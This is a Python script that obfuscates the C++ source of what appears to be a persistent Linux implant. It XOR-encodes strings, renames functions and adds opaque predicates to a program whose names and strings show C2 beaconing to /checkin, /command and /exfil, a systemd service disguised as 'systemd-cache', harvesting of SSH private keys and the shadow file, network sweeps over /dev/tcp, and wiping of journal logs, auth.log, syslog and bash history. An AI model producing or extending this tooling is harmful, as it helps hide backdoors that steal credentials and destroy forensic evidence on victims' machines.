#!/usr/bin/env python3
import sys

KEY = 0x5A

def xor_encode(s):
    return "{" + ",".join(str(ord(c) ^ KEY) for c in s) + "}"

def main():
    with open("Persistent.cpp", "r") as f:
        src = f.read()

    # 1. Obfuscate only specific sensitive strings using exact literal replacements
    sensitive_strings = [
        "127.0.0.1",
        "systemd-cache-svc",
        "systemd-cache.service",
        "/usr/local/bin/systemd-cache-svc",
        "/etc/systemd/system/systemd-cache.service",
        "/checkin",
        "/command",
        "/result",
        "/exfil",
        "hostname",
        "whoami",
        "id_rsa",
        "id_ecdsa",
        "id_ed25519",
        "id_dsa",
        "shadow",
        "systemctl stop ",
        "systemctl disable ",
        "systemctl daemon-reload 2>/dev/null",
        "systemctl reset-failed 2>/dev/null",
        "journalctl --rotate 2>/dev/null",
        "journalctl --vacuum-time=1s 2>/dev/null",
        "sed -i '/",
        "/d' /var/log/auth.log 2>/dev/null",
        "/d' /var/log/syslog 2>/dev/null",
        "rm -f /tmp/.systemd-cache 2>/dev/null",
        "rm -f /tmp/.persist.sh 2>/dev/null",
        "rm -rf /tmp/sudostage.* 2>/dev/null",
        "sed -i '/systemd-cache/d' /root/.bash_history 2>/dev/null",
        "sed -i '/Persistent/d' /root/.bash_history 2>/dev/null",
        "ip route show default 2>/dev/null",
        "ip -4 addr show scope global 2>/dev/null | grep inet | head -1 | awk '{print $2}'",
        "ping -c 1 -W 1 ",
        " 2>/dev/null | grep -c '1 received'",
        "(echo >/dev/tcp/",
        ") 2>/dev/null && echo open || echo closed"
    ]

    strings_map = {}
    sid = 0
    for s in sensitive_strings:
        var_name = f"_s{sid}"
        sid += 1
        strings_map[var_name] = s
        
        # Replace instances of `"string"` with `zz(var_name).c_str()` for C APIs or `zz(var_name)`
        # Since C++ concatenate allows `+`, we can just replace the literal "string" with zz(var_name)
        src = src.replace(f'"{s}"', f'zz({var_name})')

    # Fix const char* issues for specific popen/fopen/c_str usages
    src = src.replace("popen(cmd.c_str(), \"r\")", "popen(cmd.c_str(), \"r\")") # We didn't obfuscate "r" so it's fine

    # 2. Identifier Renaming
    renames = {
        "runCommand": "_rc",
        "jsonValue": "_jv",
        "jsonEscape": "_je",
        "recover_key": "_rk",
        "base64url_encode": "_b64e",
        "base64url_decode": "_b64d",
        "split_fernet_key": "_sfk",
        "fernet_encrypt": "_fe",
        "fernet_decrypt": "_fd",
        "C2_HOST": "_ch",
        "C2_PORT": "_cp",
        "POLL_SECONDS": "_ps",
        "JITTER_PERCENT": "_jp",
        "SVC_BINARY": "_sb",
        "SVC_UNIT": "_su",
        "SVC_NAME": "_sn",
        "connect_c2": "_cc",
        "recv_http_body": "_rhb",
        "http_post": "_hp",
        "http_get": "_hg",
        "post_encrypted": "_pe",
        "get_encrypted": "_ge",
        "sendResult": "_sr",
        "taskNetworkSweep": "_tns",
        "readFileBytes": "_rfb",
        "taskCredentialHarvest": "_tch",
        "taskExfil": "_te",
        "taskSelfDestruct": "_tsd",
        "taskFullChain": "_tfc",
        "dispatchCommand": "_dc",
        "poll_loop": "_pl"
    }

    import re
    for old, new in renames.items():
        src = re.sub(rf'\b{old}\b', new, src)

    # 3. Inject boilerplate at top
    boilerplate = """
using VI = std::vector<int>;

static std::string zz(const VI& c) {
    std::string o; for (int i : c) o += (char)(i ^ 0x5A); return o;
}

static void _dc0() { int x = 42; if (((x*x) < 0)) exit(0); }
"""

    string_defs = ""
    for var_name, val in strings_map.items():
        string_defs += f"static const VI {var_name} = {xor_encode(val)};\n"

    include_end = src.rfind('#include')
    insert_pos = src.find('\n', include_end) + 1

    final_src = src[:insert_pos] + boilerplate + string_defs + src[insert_pos:]
    
    # 4. Inject opaque predicate into main
    main_pattern = r"int main\(\)\s*\{"
    main_replacement = """int main() {
    _dc0();
    int op = 7;
    if (((op * op + op) % 2) == 0) {"""
    
    final_src = re.sub(main_pattern, main_replacement, final_src)
    
    ret_pattern = r"return 0;\s*\n\s*\}"
    ret_replacement = "    }\n    return 0;\n}"
    final_src = re.sub(ret_pattern, ret_replacement, final_src)

    with open("PersistentObfuscated.cpp", "w") as f:
        f.write(final_src)

if __name__ == "__main__":
    main()
